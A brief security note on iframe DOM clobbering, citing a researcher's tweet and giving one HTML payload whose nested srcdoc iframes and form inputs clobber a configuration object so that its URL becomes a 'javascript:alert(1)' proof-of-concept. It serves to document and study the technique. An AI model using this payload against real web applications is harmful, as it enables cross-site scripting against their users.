# iframe DOM-clobbering: 
https://twitter.com/fransrosen/status/1361427940165189639
```
<iframe name="chatConfig" id="chatConfig" srcdoc="<iframe name=chat id=chat srcdoc='<iframe name=settings id=settings srcdoc=&quot;<form id=page name=page><input name=url value=javascript:alert(1)>&quot;></iframe>'></iframe>">
```
